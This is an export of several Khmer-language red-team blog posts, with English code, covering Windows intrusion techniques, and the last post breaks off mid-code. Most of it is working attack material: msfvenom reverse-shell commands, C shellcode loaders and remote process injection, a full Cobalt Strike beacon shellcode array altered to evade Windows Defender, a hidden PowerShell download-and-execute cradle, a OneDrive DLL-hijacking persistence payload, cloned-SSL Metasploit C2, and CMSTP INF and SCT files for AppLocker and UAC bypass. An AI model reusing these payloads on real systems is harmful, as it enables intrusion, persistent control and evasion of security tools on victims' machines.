[{"content":"Self-Injection Payload ខាងក្រោមជាដំណើរការបង្កើត Payload ដោយប្រើប្រាស់ Shellcode ជាភាសារ C គោលដៅលើម៉ាស៊ីន 64 bit ។\n1  msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.60.136 lport=4433 -f c   បន្ទាប់មកយើងនឹងសាកល្បង Compile Payload ធម្មតាដោយប្រើប្រាស់វិធីសាស្ត្រ Process Injection តាមបែប Slef-Injection ដោយផ្ដល់សិទ្ធតាមលំនាំដើម Read, Write និង Execute ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;Windows.h\u0026gt; int main() { unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\u0026#34; \u0026#34;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\u0026#34; \u0026#34;\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\u0026#34; \u0026#34;\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\u0026#34;; void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ដើម្បី Compile យើងអាចប្រើប្រាស់កម្មវិធីផ្សេងៗជាច្រើន តែសម្រាប់ខ្ញុំៗប្រើប្រាស់ Embarcadero Dev-C++ ដើម្បីដំណើរការបង្កើត ។\nដោយសាកល្បងដំណើរការ Payload នេះយើងនឹងទទួលបាន Meterpreter ដូចដែលយើងរំពឹងទុក ។\nPwn Self Injection ខាងក្រោមជាវិធីសាស្ត្រសម្រាប់ចាក់ Process ចូលទៅកាន់ PID ណាមួយដោយមិនមាន DEP protection និងមិនមានសិទ្ធក្នុងការសរសេរចូល ឬដំណើរការបាន (Non-Writable / Non-Readable Allocation) ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;Windows.h\u0026gt; int main(int argc, char* argv[]) { unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\u0026#34; \u0026#34;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\u0026#34; \u0026#34;\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\u0026#34; \u0026#34;\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\u0026#34;; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; DWORD oldPerms; DWORD PID = 1524; printf(\u0026#34;Injecting to PID: %i\u0026#34;, PID); processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ); WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); VirtualProtectEx(processHandle, (LPVOID)sizeof(processHandle), sizeof(shellcode), PAGE_READONLY, \u0026amp;oldPerms); remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); return 0; }   កែត្រង់ PID បន្ទាប់មក Compile កូដខាងលើតាមធម្មតា (សម្រាប់ Visual Studio 20xx តម្រូវឲ្យធ្វើការបិទ DEP Protection មុននិង Build) បន្ទាប់មកសូមសាកល្បងបើកដំណើរការ ។\nជោគជ័យ!!! ពេលនេះយើងបានចាក់ Shellcode ចូលទៅក្នុង Process នៃកម្មវិធី Notepad.exe តាមរយៈ PID 1524 ដោយមិនមានសិទ្ធ Write ឬ Execute បានសម្រេច ៕\nសម្រង់ចេញពី៖ XRET2PWN\n","description":"ចាក់បញ្ជូល Shellcode ក្នុង Process ដោយគ្មាន Write/Exec Allocation","id":4,"section":"posts","tags":["reverse-shell","c-shellcode"],"title":"Process Injection without Write/Execute Permission","uri":"https://thiklab.com/en/posts/process-injection-without-write-exec-permission/"},{"content":"ខាងក្រោមនេះជាគំនិតផ្ទាល់ខ្លួនក្នុងការតភ្ជាប់ Teamserver និងប្រើប្រាស់ពាក្យបញ្ជាតាមរយៈ Beacons ពីចំងាយដោយមិនចាំបាច់បើក Port Forwarding ។\nRequirements  CobaltStrike Telebit  Telebit Setup ចំណាំ៖ ចូលទៅកាន់ telebit.cloud ដើម្បីយល់ដឹងបន្ថែមអំពី Configuration ។\nនៅក្នុងលីនុចសូមបើកផ្ទាំង Terminal រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖\n1 2  // Install Telebit curl https://get.telebit.io/ | bash   ក្រោយពីបំពេញអាសយដ្ឋាន Email រួចសូមចូលទៅកាន់ផ្ទាំង Inbox រួចបើកដំណើរដំណភ្ជាប់ដែលគេបានផ្ញើមក និងចម្លងចូលនូវលេខទាំង ៤ ខ្ទង់នោះដើម្បីផ្ទៀងផ្ទាត់ ។\nប្រសិនបើមិនមានអ្វីខុសឆ្គងទេ យើងនឹងទទួលបានសារបញ្ជាក់ពីភាពជោគជ័យដូចខាងក្រោម៖\nUsage តស់! ឥលូវចាប់ផ្ដើមធ្វើការកំណត់នៅលេខ Port សម្រាប់តភ្ជាប់ទៅកាន់ Teamserver និង Beacons\n1 2 3 4 5  // Setup Teamserver Port ~/telebit tcp 50050 // Setup HTTP Beacon ~/telebit http 80 //don\u0026#39;t change the port   Teamserver Connection បន្ទាប់មកសូមវាយពាក្យបញ្ជាដូចខាងក្រោមដើម្បីបើកដំណើរការ Teamserver\n1  sudo ./teamserver x.x.x.x your_password   ដូច្នេះយើងសាកល្បងតភ្ជាប់ Teamserver ដោយប្រើប្រាស់លេខអាយភីរបស់ telebit.cloud ដូចខាងក្រោម៖\nសូមឲ្យប្រាកដថាលេខអាយភី (អាច ping ចេញពី telebit.cloud) លេខច្រក (Port) និង លេខសំងាត់គឺត្រឹមត្រូវមុននិងចុចតភ្ជាប់។\nជោគជ័យ! ឥលូវនេះយើងបានតភ្ជាប់ Teamserver បានសម្រេច។\nAdding HTTP/HTTPS Listener ខាងក្រោមនេះជាវិធីក្នុងការបើកដំណើរការ Listener ពីចំងាយដោយប្រើប្រាស់ Protocol ប្រភេទ HTTP។\nដោយសារតែ Telebit ត្រូវបាន Redirect ទៅកាន់ Protocol ប្រភេទ HTTPS ដូចនេះយើងក៏ត្រូវតែបើក Listener ជាប្រភេទ HTTPS មួយទៀត។\nសូមធ្វើការបើក HTTPS Listener ដូចបានបង្ហាញខាងក្រោម៖\nGenerate Beacon ការកំណត់ខាងលើរួចរាល់អស់ហើយ ដូចនេះយើងអាចសាកល្បងបង្កើត Beacon ដើម្បីតភ្ជាប់។\nនៅក្នុងការបង្ហាញនេះយើងនិងប្រើប្រាស់ការវាយប្រហារបែប Scripted Web Delivery ។\nចំណាំ៖ នៅពេលដែលបានបង្កើតរួចសូមធ្វើការកែប្រែនៅផ្នែកមួយចំនួនដូចជាប្រភេទ Protocol និង Port ដូចខាងក្រោម៖\n1 2 3 4 5  // By default it will download from port 80 without https powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://shy-impala-40.telebit.io:80/foo\u0026#39;))\u0026#34; // Then we have to remove the port and add https instead powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;https://shy-impala-40.telebit.io/foo\u0026#39;))\u0026#34;   Execute យើងបានសាកល្បងបើកដំណើរការនៅក្នុងវីនដូ ១០ ប្រភេទ Pro x64 Bit ដូចរូបខាងក្រោម៖\nប្ដូទៅមើលផ្ទាំងគ្រប់គ្រង CobaltStrike យើងនឹងទទួលបានការតភ្ជាប់ Beacon ពីវីនដូ ១០ នោះ៕\n","description":"តភ្ជាប់ និងប្រើប្រាស់ពាក្យបញ្ជាក្នុង CobaltStrike ពីចំងាយ","id":5,"section":"posts","tags":["tunnel","over-wan"],"title":"CobaltStrike Over WAN Connection","uri":"https://thiklab.com/en/posts/cobaltstrike-overwan-connection/"},{"content":"C - Execute Command Prompt ចម្លងកូដ និង កែប្រែទីតាំងរបស់ Payload​ ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  #include \u0026lt;windows.h\u0026gt;using namespace std; void exec() { WinExec(\u0026#34;cmd.exe /c c:\\\\programdata\\\\putty.exe\u0026#34;, 0); } BOOL WINAPI DllMain (HANDLE hDLL, DWORD dwReason, LYVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: exec(); break; } return TRUE; }  \nDLL Build ចូលទៅកាន់ផ្ទាំង Terminal ក្នុងប្រព័ន្ធប្រតិបត្តិការលីនុច រួចវាយពាក្យបញ្ជាដូខខាងក្រោម៖\n1 2 3 4 5 6 7 8  // To create Windows executables, you need to instsall mingw cross-compiler sudo apt-get install mingw-w64 //For x64 compile with: x86_64-w64-mingw32-gcc r4t.c -shared -o output.dll //For x86 compile with: i686-w64-mingw32-gcc r4t.c -shared -o output.dll   Get Persistence In Windows 10 ប្ដូរឈ្មោះ Payload ដែលបានបង្កើតរួច ឲ្យទៅជា cscapi.dll បន្ទាប់មកចម្លងឯកសារមេរោគនោះដាក់ចូលទៅកាន់បណ្ដុំនៃឯកសាររបស់ OneDrive ដែលមានទីតាំងដូចខាងក្រោម៖\n1  C:\\Users\\[username]\\AppData\\Local\\Microsoft\\OneDrive\\   \nវីធីសាស្ត្រនេះគឺអាចដាក់ Persistence បានដោយប្រើប្រាស់ឯកសារយោងនៃ onedrive.exe ដូចនេះនៅរាល់ពេលដែលកម្មវិធី OneDrive ដែលបានដម្លើងមកស្រាប់ក្នុងវីនដូត្រូវបានបើកនៅក្នុង Start Up នោះវានឹងទៅបើកដំណើរការឯកសារមេរោគផ្ទាល់តែម្ដង។\nពាក្យបញ្ជាទាំងពីរខាងក្រោមនេះសម្រាប់សម្លាប់ Process ដែលកំពុងបើក និងបើកដំណើរការកម្មវិធីឡើងមកវិញ ក្នុងករណីបើអ្នកចង់សាកម្ដងដំណើរការវិធីសាស្ត្រខាងលើភ្លាមៗដោយមិនចាំបាច់ធ្វើការ Restart កុំព្យូទ័រ៕\n1 2 3 4 5  //To kill the onedrive procress type taskkill /im onedrive.exe /f //Run the file cmd.exe /c onedrive.exe   ឯកសារយោង៖ ippsec\n","description":"បើក Persistence តាមរយៈវិធីសាស្ត្រ DLL Hijacking","id":6,"section":"posts","tags":["dll","reverse-shell","persistence"],"title":"DLL Hijacking - Persistence Method","uri":"https://thiklab.com/en/posts/dll-hijacking-persistence-method/"},{"content":"1 Byte Evading ដំបូងយើងត្រូវបង្កើត Shell Code ជាប្រភេទភាសារ C នៅក្នុង Cobalt Strike ដូចរូបខាងក្រោម៖\nសូមចាប់អារម្មណ៏ត្រង់ Byte ដំបូងគេនៃ Code គឺ \\xfc ។\nតស់!!! មកកែប្រែចំនួន Byte ដូចខាងក្រោម៖\nប្ដូរ \\xfc ទៅជាចំនួនតម្លៃ Byte ផ្សេង។ ឧ. \\xfd, \\x3a, \\x6f\\ ។ល។\rរក្សាតម្លៃដើមដែលត្រឹមត្រូវនៅក្នុង Char Variable = char first[] = \"\\xfc\";\rBuild ឯកសារ exe ជាមួយកម្មវិធីអានកូដជាការស្រេច។\r\rខាងក្រោមជា Source Code សម្រាប់អ្នកដែលចង់សាកល្បងវិធីសាស្ត្រមួយនេះ៕\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  //payload.cpp #include \u0026#34;stdafx.h\u0026#34;#include \u0026#34;Windows.h\u0026#34;#include \u0026lt;iostream\u0026gt; int main(int argc, char *argv[]) { ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // cobalt strike beacon shellcode x64 \tunsigned char shellcode[] = \u0026#34;\\xfd\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x66\\x81\\x78\\x18\\x0b\\x02\\x75\\x72\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x4f\\xff\\xff\\xff\\x5d\\x6a\\x00\\x49\\xbe\\x77\\x69\\x6e\\x69\\x6e\\x65\\x74\\x00\\x41\\x56\\x49\\x89\\xe6\\x4c\\x89\\xf1\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\\x48\\x31\\xc9\\x48\\x31\\xd2\\x4d\\x31\\xc0\\x4d\\x31\\xc9\\x41\\x50\\x41\\x50\\x41\\xba\\x3a\\x56\\x79\\xa7\\xff\\xd5\\xeb\\x73\\x5a\\x48\\x89\\xc1\\x41\\xb8\\xbb\\x01\\x00\\x00\\x4d\\x31\\xc9\\x41\\x51\\x41\\x51\\x6a\\x03\\x41\\x51\\x41\\xba\\x57\\x89\\x9f\\xc6\\xff\\xd5\\xeb\\x59\\x5b\\x48\\x89\\xc1\\x48\\x31\\xd2\\x49\\x89\\xd8\\x4d\\x31\\xc9\\x52\\x68\\x00\\x02\\x60\\x84\\x52\\x52\\x41\\xba\\xeb\\x55\\x2e\\x3b\\xff\\xd5\\x48\\x89\\xc6\\x48\\x83\\xc3\\x50\\x6a\\x0a\\x5f\\x48\\x89\\xf1\\x48\\x89\\xda\\x49\\xc7\\xc0\\xff\\xff\\xff\\xff\\x4d\\x31\\xc9\\x52\\x52\\x41\\xba\\x2d\\x06\\x18\\x7b\\xff\\xd5\\x85\\xc0\\x0f\\x85\\x9d\\x01\\x00\\x00\\x48\\xff\\xcf\\x0f\\x84\\x8c\\x01\\x00\\x00\\xeb\\xd3\\xe9\\xe4\\x01\\x00\\x00\\xe8\\xa2\\xff\\xff\\xff\\x2f\\x63\\x72\\x38\\x50\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x00\\x55\\x73\\x65\\x72\\x2d\\x41\\x67\\x65\\x6e\\x74\\x3a\\x20\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x34\\x2e\\x30\\x20\\x28\\x63\\x6f\\x6d\\x70\\x61\\x74\\x69\\x62\\x6c\\x65\\x3b\\x20\\x4d\\x53\\x49\\x45\\x20\\x37\\x2e\\x30\\x3b\\x20\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73\\x20\\x4e\\x54\\x20\\x35\\x2e\\x31\\x3b\\x20\\x2e\\x4e\\x45\\x54\\x20\\x43\\x4c\\x52\\x20\\x31\\x2e\\x31\\x2e\\x34\\x33\\x32\\x32\\x29\\x0d\\x0a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x34\\x28\\x50\\x5e\\x29\\x37\\x43\\x43\\x29\\x37\\x7d\\x24\\x45\\x49\\x43\\x41\\x52\\x2d\\x53\\x54\\x41\\x4e\\x44\\x41\\x52\\x44\\x2d\\x41\\x4e\\x54\\x49\\x56\\x49\\x52\\x55\\x53\\x2d\\x54\\x45\\x53\\x54\\x2d\\x46\\x49\\x4c\\x45\\x21\\x24\\x48\\x2b\\x48\\x2a\\x00\\x35\\x4f\\x21\\x50\\x25\\x40\\x41\\x50\\x5b\\x34\\x5c\\x50\\x5a\\x58\\x35\\x00\\x41\\xbe\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x48\\x31\\xc9\\xba\\x00\\x00\\x40\\x00\\x41\\xb8\\x00\\x10\\x00\\x00\\x41\\xb9\\x40\\x00\\x00\\x00\\x41\\xba\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x48\\x93\\x53\\x53\\x48\\x89\\xe7\\x48\\x89\\xf1\\x48\\x89\\xda\\x41\\xb8\\x00\\x20\\x00\\x00\\x49\\x89\\xf9\\x41\\xba\\x12\\x96\\x89\\xe2\\xff\\xd5\\x48\\x83\\xc4\\x20\\x85\\xc0\\x74\\xb6\\x66\\x8b\\x07\\x48\\x01\\xc3\\x85\\xc0\\x75\\xd7\\x58\\x58\\x58\\x48\\x05\\x00\\x00\\x00\\x00\\x50\\xc3\\xe8\\x9f\\xfd\\xff\\xff\\x31\\x30\\x2e\\x30\\x2e\\x30\\x2e\\x35\\x00\\x00\\x00\\x00\\x00\u0026#34;; char first[] = \u0026#34;\\xfc\u0026#34;; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(shellcode, first, 1); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }   ឯកសារយោង៖ ired\n","description":"Evading Windows Defender ដោយប្រើប្រាស់បច្ចេកទេសប្ដូរតម្លៃលេខគោលពីរ","id":7,"section":"posts","tags":["reverse-shell","c-shellcode"],"title":"1 Byte Changed Evading Win Defender","uri":"https://thiklab.com/en/posts/av-evading-1-byte-change/"},{"content":"Clone SSL Certification តើអ្នកដឹងទេថា យើងអាចធ្វើការថតចម្លងនូវរាល់ឯកសារ SSL Certificate របស់គេហទំព័រដទៃបាន ដោយប្រើប្រាស់ Module មួយនៅក្នុង Metasploit Framework ដែលត្រូវបានបង្កើតឡើងដោយលោក Chris John Riley ។ ឯកសារដែលត្រូវបានថតចម្លងនោះ នឹងត្រូវរក្សាទុកជាប្រភេទទម្រង់ឯកសារ PEM ហើយវាក៏អាចប្រើប្រាស់បានគ្រប់ប្រភេទ Modules នៅក្នុង Metasploit ផងដែរ។\nដើម្បីថតចម្លង យើងអាចប្រើប្រាស់ពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3  use auxiliary/gather/impersonate_ssl set rhosts https://example.com/ exploit   ដូចដែលរូបបានបង្ហាញខាងលើ គឺយើងបានថតចម្លងឯកសារ Certificate បានសម្រេច។\nMeterpreter Using SSL Connection ខាងក្រោមនេះគឺជាការសាកល្បងប្រើប្រាស់ SSL Certificate ដែលបានថតចម្លងនោះមកភ្ជាប់ទំនាក់ទំងរវាង Attacker PC និង Victim PC ដោយប្រើប្រាស់ Reverse Shell ជាប្រភេទ HTTPS ។\nបើកចូលផ្ទាំង Terminal នៃ Metasploit Framework រួចបញ្ចូលពាក្យបញ្ជាដូចខាងក្រោម៖\n1 2 3 4 5 6 7  use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost 192.168.xxx.xxx set lport xxx set stagerverifysslcert true set handlersslcert /xxx/xxx/xxx/cert.pem exploit   Generate HTTPS Malicious Payload បង្កើតមេរោគតាមរយៈ Msfvenom និងជ្រើសរើស HTTPS Reverse Shell ។\n1  msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.xxx.xxx lport=xxx -f exe -b \u0026#39;\\x00\u0026#39; -o ~/Desktop/s0rry.exe   Exploited សាកល្បងបើកដំណើរការមេរោគក្នុងប្រព័ន្ធប្រតិបត្តិការវីនដូ។\nជោគជ័យ!!! C2 ពេលនេះដំណើរការនៅលើ SSL Encryption ៕\n","description":"ក្លែងបន្លំ SSL និងបញ្ជៀសពីការចាប់របស់ AV","id":8,"section":"posts","tags":["metasploit","ssl","bypass","reverse-shell"],"title":"Impersonate SSL - MSF Bypass Detection","uri":"https://thiklab.com/en/posts/bypass-detection-msf-shell/"},{"content":"ឯកសារ CMSTP ត្រូវបានរក្សាទុកនៅក្នុងថតឯកសារនៃវីនដូ៖\n1 2  C:\\Windows\\System32\\cmstp.exe C:\\Windows\\SysWOW64\\cmstp.exe   វីធីសាស្ត្រមួយនេះត្រូវបានរកឃើញដោយលោក Oddvar Moe អាចអានលំអិតនៅក្នុង Blog របស់គាត់។\nDLL Metasploit ត្រូវបានប្រើប្រាស់ដើម្បីបង្កើតឯកសារមេរោគ DLL តាមរយៈ MSFvenom ។\n1  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.55 LPORT=4444 -f dll \u0026gt; idm.dll   សម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងរបស់ឯកសារ DLL ដែល​បាន​បង្កើត​រួច។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] C:\\Users\\Victim\\idm.dll [Strings] AppAct = \u0026#34;SOFTWARE\\Microsoft\\Connection Manager\u0026#34; ServiceName=\u0026#34;idm\u0026#34; ShortSvcName=\u0026#34;idm\u0026#34;   រក្សាទុកជា \u0026ldquo;idm-service.inf\u0026rdquo;\nបើកដំណើរការ Multi/handler នៅលើម៉ាស៊ីនមេ និង កំណត់ទទួលការតភ្ជាប់។\nPayload នឹងដំណើរការភ្លាមៗនៅពេលដែលឯកសារ INF ត្រូវ​បាន​បើក​ដោយ​ប្រើប្រាស់ឯកសារ CMSTP ។\nបន្ទាប់មក Metasploit និងទទួលបាន Reverse Shell ក្រោយពីស្គ្រីបបានបើកឯកសារ DLL រួច។\nSCT CMSTP ក៏អាចប្រើប្រាស់ឯកសារប្រភេទ SCT ដើម្បី​ទាញយក​ពាក្យ​បញ្ជា​ផ្សេងៗ​ពីម៉ាស៊ីនមេ​មក​ប្រើប្រាស់​ផង​ដែរ។\nលោក Nick Tyrere បានបង្ហាញលំអិតនៅក្នុង Twitter របស់គាត់។\nលោកក៏បានបង្កើតស្គ្រីបនេះដោយដាក់ឈ្មោះថា powersct.sct ដែល​​ប្រើ​សម្រាប់​បើក​ដំណើរ​ការ​ពាក្យ​បញ្ជា​គ្រោះ​ថ្នាក់​ណាមួយ​ចេញ​ពី PowerShell ។\nសម្រាប់ផ្នែក RegisterOCXSection តម្រូវឲ្យដាក់ទីតាំងដំណរភ្ជាប់របស់ឯកសារ SCT ។\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  [version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall_SingleUser] RegisterOCXs=RegisterOCXSection [RegisterOCXSection] %11%\\scrobj.dll,NI,http://192.168.200.55/pentestlab.sct [Strings] AppAct = \u0026#34;SOFTWARE\\Microsoft\\Connection Manager\u0026#34; ServiceName=\u0026#34;idm\u0026#34; ShortSvcName=\u0026#34;idm\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ### powersct.sct \u0026lt;?XML version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration  progid=\u0026#34;Pentest\u0026#34; classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;!-- Proof Of Concept - @netbiosX --\u0026gt; \u0026lt;script language=\u0026#34;JScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;cmd /k cd c:\\ \u0026amp; pentestlab.exe\u0026#34;);\t ]]\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ### SCT File Obfuscation Examples: \u0026lt;?XML version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;scriptlet\u0026gt; \u0026lt;registration  progid=\u0026#34;PoC\u0026#34; classid=\u0026#34;{F0001111-0000-0000-0000-0000FEEDACDC}\u0026#34; \u0026gt; \u0026lt;!-- Proof Of Concept - Casey Smith @subTee --\u0026gt; \u0026lt;!-- License: BSD3-Clause --\u0026gt; \u0026lt;script language=\u0026#34;JScript\u0026#34;\u0026gt; \u0026lt;![CDATA[ //x86 only. C:\\Windows\\Syswow64\\regsvr32.exe /s /u /i:file.sct scrobj.dll var scr = new ActiveXObject(\u0026#34;MSScriptControl.ScriptControl\u0026#34;); scr.Language = \u0026#34;JScript\u0026#34;; scr.ExecuteStatement(\u0026#39;var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;calc.exe\u0026#34;);\u0026#39;); scr.Eval(\u0026#39;var r = new ActiveXObject(\u0026#34;WScript.Shell\u0026#34;).Run(\u0026#34;calc.exe\u0026#34;);\u0026#39;); //https://msdn.microsoft.com/en-us/library/aa227637(v=vs.60).aspx //Lots of hints here on futher obfuscation ]]\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/registration\u0026gt; \u0026lt;/scriptlet\u0026gt;   នៅពេលដំណើរការស្ក្រីបនៃឯកសារ INF វានឹងលោត​ផ្ទាំង​វីន​ដូមួយ​ចេញ​មក​ដើម្បី​ដំណើរ​ការ​ពាក្យ​បញ្ជា PowerShell ។\nក្រោយដំណើរការស្ក្រីបរួច ឯកសារមេរោគនឹងធ្វើការទាញយកពីម៉ាស៊ីនមេហើយធ្វើប្រតិបត្តិភ្លាមៗតែម្ដង។\nពេលនោះ Metasploit និងទទួលបាន Reverse Shell ហើយគ្រប់​គ្រង​ម៉ាស៊ីន​ទាំង​មូល៕\nឯកសារយោង:\n pentestlab.blog ha.cker.in ired.team  ","description":"DLL Bypass AppLocker ជាមួយឯកសារ CMSTP","id":9,"section":"posts","tags":["dll","bypass","inf","sct"],"title":"AppLocker Bypass - CMSTP","uri":"https://thiklab.com/en/posts/applocker-cmstp-bypass/"},{"content":"ដើម្បីធ្វើការ Bypass ទៅលើ UAC នៅរាល់ប្រព័ន្ធប្រតិបត្តិការវីនដូជំនាន់ថ្មី (៨/១០/១១) យើងអាចប្រើប្រាស់ឯកសារ PS1 ដើម្បីបង្កើតចេញជា dll reflection ដែលអាច Exploit តាមរយៈឯកសារដើម cmstp.exe នៃប្រព័ន្ធគោលពីរ។\nC# DLL Reflection Code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100  /* UAC Bypass using CMSTP.exe microsoft binary. Code author: Andre Marques (@_zc00l) */ using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Windows; using System.Runtime.InteropServices; public class CMSTPBypass { // Our .INF file data! 